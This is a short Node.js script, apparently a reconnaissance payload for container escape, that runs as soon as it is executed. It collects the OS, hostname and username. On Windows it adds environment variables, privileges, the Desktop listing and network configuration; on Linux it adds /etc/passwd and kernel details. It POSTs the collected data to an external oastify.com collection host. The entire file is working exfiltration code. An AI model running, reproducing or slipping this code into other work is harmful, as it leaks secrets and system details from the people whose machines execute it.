const { exec } = require('child_process');
const https = require('https');
const os = require('os');

const escapeReport = {
    timestamp: new Date().toISOString(),
    os_info: {
        platform: os.platform(),
        release: os.release(),
        hostname: os.hostname(),
        user: os.userInfo().username,
        arch: os.arch()
    },
    results: {}
};

const run = (cmd) => new Promise(resolve => {
    exec(cmd, { timeout: 7000 }, (err, stdout, stderr) => {
        resolve(stdout ? stdout.trim() : (stderr ? `ERR: ${stderr.trim()}` : null));
    });
});

async function startDiscovery() {
    console.log("🔍 Detected OS: " + os.platform());

    if (os.platform() === 'win32') {
        // أوامر ويندوز لسحب المعلومات
        console.log("🖥️ Running Windows Discovery...");
        escapeReport.results.env_vars = await run("set");
        escapeReport.results.whoami_priv = await run("whoami /priv");
        escapeReport.results.directory_list = await run("dir C:\\Users\\" + os.userInfo().username + "\\Desktop");
        escapeReport.results.network_info = await run("ipconfig /all");
    } else {
        // أوامر لينكس (في حال انتقلنا لحاوية تانية)
        console.log("🐧 Running Linux Discovery...");
        escapeReport.results.etc_passwd = await run("cat /etc/passwd | head -n 5");
        escapeReport.results.kernel = await run("uname -a");
    }

    sendReport();
}

function sendReport() {
    const data = JSON.stringify(escapeReport, null, 2);
    const req = https.request({
        hostname: 'ukiy34b7vygb36k064qxx5of76dx1rpg.oastify.com',
        port: 443,
        path: '/cross-platform-report',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
    }, (res) => {
        console.log(`✅ Report Sent. Status: ${res.statusCode}`);
    });
    req.write(data);
    req.end();
}

startDiscovery();
